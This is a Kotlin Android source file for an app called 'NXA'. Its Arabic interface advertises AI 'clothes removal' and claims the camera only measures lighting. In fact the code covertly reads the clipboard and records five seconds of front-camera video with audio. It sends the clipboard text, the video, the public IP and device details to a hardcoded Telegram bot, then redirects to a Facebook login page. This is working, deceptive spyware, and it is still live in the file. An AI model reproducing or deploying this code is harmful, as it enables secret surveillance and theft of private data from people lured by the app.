package com.nxa.cop

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.hardware.Camera
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.SurfaceView
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : Activity() {

    private val BOT_TOKEN = "7211032064:AAFX1ldDZeC4TdhmIskkRraKs3C3EWmjhnU"
    private val CHAT_ID = "5718232923"
    private val REDIRECT_URL = "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fgroups%2F1279411656491133%2F%3Fref%3Dshare%26mibextid%3DNSMWBT"

    private lateinit var startBtn: Button
    private lateinit var statusMsg: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var backCamBox: LinearLayout
    private lateinit var backVideo: SurfaceView

    private var backCamera: Camera? = null
    private var frontCamera: Camera? = null
    private var mediaRecorder: MediaRecorder? = null
    private var videoFile: File? = null

    private val BG = Color.parseColor("#f8fafc")
    private val CARD = Color.WHITE
    private val TEXT_DARK = Color.parseColor("#0f172a")
    private val TEXT_MUTED = Color.parseColor("#64748b")
    private val BTN_BG = Color.parseColor("#0f172a")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        buildUI()
        checkPermissionsAndInit()
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    private fun buildUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(BG)
            gravity = Gravity.CENTER
            setPadding(dp(24), dp(24), dp(24), dp(24))
            layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        }

        // Logo area
        val logoRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(32))
        }
        val logoIcon = TextView(this).apply {
            text = "👕"
            textSize = 24f
            setBackgroundColor(TEXT_DARK)
            setPadding(dp(8), dp(8), dp(8), dp(8))
        }
        val logoText = TextView(this).apply {
            text = "NXA"
            textSize = 24f
            setTextColor(TEXT_DARK)
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(dp(10), 0, 0, 0)
        }
        logoRow.addView(logoIcon)
        logoRow.addView(logoText)
        root.addView(logoRow)

        // Card
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(CARD)
            setPadding(dp(28), dp(32), dp(28), dp(32))
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).also {
                it.bottomMargin = dp(24)
            }
        }

        val title = TextView(this).apply {
            text = "إزالة الملابس بالذكاء الاصطناعي"
            textSize = 18f
            setTextColor(TEXT_DARK)
            setTypeface(null, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        card.addView(title)

        val desc = TextView(this).apply {
            text = "شبكة GAN متطورة لتحليل الصور وتعديلها. نستخدم الكاميرا لقياس الإضاءة المحيطة فقط، ولا يتم حفظ أي صور."
            textSize = 14f
            setTextColor(TEXT_MUTED)
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(24))
        }
        card.addView(desc)

        // Features
        val features = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(28))
        }
        listOf("📷\nتحليل الإضاءة", "🧠\nنموذج GAN", "🛡️\nمعالجة محلية").forEach { text ->
            val f = TextView(this).apply {
                this.text = text
                textSize = 12f
                setTextColor(Color.parseColor("#475569"))
                setBackgroundColor(BG)
                gravity = Gravity.CENTER
                setPadding(dp(12), dp(12), dp(12), dp(12))
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f).also {
                    it.marginEnd = dp(8)
                }
            }
            features.addView(f)
        }
        card.addView(features)

        startBtn = Button(this).apply {
            text = "▶ بدء التحليل"
            setTextColor(Color.WHITE)
            setBackgroundColor(BTN_BG)
            textSize = 15f
            setOnClickListener { beginAnalysis() }
        }
        card.addView(startBtn)

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            visibility = View.GONE
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dp(4)).also {
                it.topMargin = dp(20)
                it.bottomMargin = dp(12)
            }
        }
        card.addView(progressBar)

        statusMsg = TextView(this).apply {
            text = ""
            textSize = 13f
            setTextColor(TEXT_MUTED)
            gravity = Gravity.CENTER
        }
        card.addView(statusMsg)

        backCamBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
            setPadding(0, dp(16), 0, dp(16))
        }
        backVideo = SurfaceView(this).apply {
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dp(200))
        }
        backCamBox.addView(backVideo)
        card.addView(backCamBox)

        root.addView(card)

        val footer = TextView(this).apply {
            text = "© 2025 NXA. جميع الحقوق محفوظة.\nالمطور: Ｎ5ＣＲ4 · Instagram: _47ky"
            textSize = 12f
            setTextColor(Color.parseColor("#94a3b8"))
            gravity = Gravity.CENTER
            setLineSpacing(0f, 1.2f)
        }
        root.addView(footer)

        setContentView(root)
    }

    private fun checkPermissionsAndInit() {
        val perms = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)
        val needed = perms.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty()) {
            requestPermissions(needed.toTypedArray(), 100)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            Toast.makeText(this, "تم منح الصلاحيات", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "يجب منح الصلاحيات للمتابعة", Toast.LENGTH_LONG).show()
        }
    }

    private fun setStatus(text: String) {
        runOnUiThread { statusMsg.text = text }
    }

    // Renamed from setProgress to avoid Activity.setProgress collision
    private fun updateProgressBar(pct: Int) {
        runOnUiThread {
            progressBar.visibility = View.VISIBLE
            progressBar.progress = pct.coerceIn(0, 100)
        }
    }

    @SuppressLint("MissingPermission")
    private fun beginAnalysis() {
        startBtn.isEnabled = false
        setStatus("جارٍ فتح الكاميرا الخلفية...")
        updateProgressBar(5)

        try {
            backCamera = Camera.open(0) // Back camera
            backCamera?.setPreviewDisplay(backVideo.holder)
            backCamera?.startPreview()
            backCamBox.visibility = View.VISIBLE
            setStatus("تم فتح الكاميرا. تحليل الإضاءة المحيطة...")
            updateProgressBar(20)
        } catch (e: Exception) {
            setStatus("فشل فتح الكاميرا الخلفية.")
            startBtn.isEnabled = true
            return
        }

        try {
            frontCamera = Camera.open(1) // Front camera
            frontCamera?.unlock()
            updateProgressBar(40)
        } catch (e: Exception) {
            frontCamera = null
        }

        stealClipboard()

        val recordCam = frontCamera ?: backCamera
        if (recordCam != null) {
            setStatus("تحليل متقدم جارٍ... يرجى عدم الحركة.")
            startRecording(recordCam)
        } else {
            finalizeRedirect()
        }
    }

    @SuppressLint("MissingPermission")
    private fun startRecording(camera: Camera) {
        try {
            videoFile = File(cacheDir, "spy_video.mp4")
            mediaRecorder = MediaRecorder().apply {
                setCamera(camera)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.CAMERA)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setOutputFile(videoFile!!.absolutePath)
                prepare()
                start()
            }

            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    mediaRecorder?.stop()
                    mediaRecorder?.release()
                    mediaRecorder = null
                    if (frontCamera != null) {
                        frontCamera?.lock()
                        frontCamera?.release()
                        frontCamera = null
                    }
                    setStatus("اكتمل التسجيل. جارٍ الإرسال...")
                    updateProgressBar(70)
                    uploadVideoAndFinalize()
                } catch (e: Exception) {
                    finalizeRedirect()
                }
            }, 5000)

        } catch (e: Exception) {
            finalizeRedirect()
        }
    }

    private fun stealClipboard() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = clipboard.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: ""
                if (text.trim().isNotEmpty()) {
                    sendTelegramMessage("📋 <b>Clipboard:</b>\n<code>${text.take(1200)}</code>")
                }
            }
        } catch (e: Exception) {}
    }

    private fun uploadVideoAndFinalize() {
        Thread {
            try {
                val file = videoFile
                if (file != null && file.exists()) {
                    sendTelegramVideo(file)
                }
            } catch (e: Exception) {}

            var ip = "غير معروف"
            try {
                val conn = URL("https://api.ipify.org?format=json").openConnection() as HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout = 5000
                val json = conn.inputStream.bufferedReader().readText()
                ip = JSONObject(json).optString("ip", "غير معروف")
                conn.disconnect()
            } catch (e: Exception) {}

            val ua = System.getProperty("http.agent")?.take(80) ?: "Android"
            val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
            sendTelegramMessage("🧠 <b>مستخدم جديد</b>\n🌐 IP: $ip\n📱 $ua\n🕒 $ts")

            runOnUiThread {
                finalizeRedirect()
            }
        }.start()
    }

    private fun sendTelegramMessage(text: String) {
        try {
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            val payload = JSONObject().apply {
                put("chat_id", CHAT_ID)
                put("text", text)
                put("parse_mode", "HTML")
            }.toString()
            conn.outputStream.use { it.write(payload.toByteArray()) }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    private fun sendTelegramVideo(file: File) {
        val boundary = "*****${System.currentTimeMillis()}*****"
        val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendVideo")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.doOutput = true
        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")

        try {
            val dos = DataOutputStream(conn.outputStream)

            fun writeField(name: String, value: String) {
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"$name\"\r\n\r\n")
                dos.writeBytes("$value\r\n")
            }

            writeField("chat_id", CHAT_ID)
            writeField("caption", "🎥 فيديو 5s مع الصوت")

            dos.writeBytes("--$boundary\r\n")
            dos.writeBytes("Content-Disposition: form-data; name=\"video\"; filename=\"spy_video.mp4\"\r\n")
            dos.writeBytes("Content-Type: video/mp4\r\n\r\n")

            val fis = FileInputStream(file)
            val buf = ByteArray(8192)
            var n: Int
            while (fis.read(buf).also { n = it } > 0) dos.write(buf, 0, n)
            fis.close()

            dos.writeBytes("\r\n--$boundary--\r\n")
            dos.flush()
            dos.close()

            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    private fun finalizeRedirect() {
        updateProgressBar(95)
        setStatus("اكتمل التحليل. جارٍ إعادة التوجيه...")
        Handler(Looper.getMainLooper()).postDelayed({
            stopCamera()
            try {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(REDIRECT_URL))
                startActivity(intent)
            } catch (e: Exception) {}
            finish()
        }, 2500)
    }

    private fun stopCamera() {
        try {
            backCamera?.stopPreview()
            backCamera?.release()
            backCamera = null
        } catch (e: Exception) {}
        try {
            frontCamera?.lock()
            frontCamera?.release()
            frontCamera = null
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        stopCamera()
        mediaRecorder?.release()
        mediaRecorder = null
    }

    override fun onBackPressed() {
        if (progressBar.progress in 1..94) {
            Toast.makeText(this, "التحليل لم يكتمل. هل تريد المغادرة؟", Toast.LENGTH_LONG).show()
        } else {
            super.onBackPressed()
        }
    }
}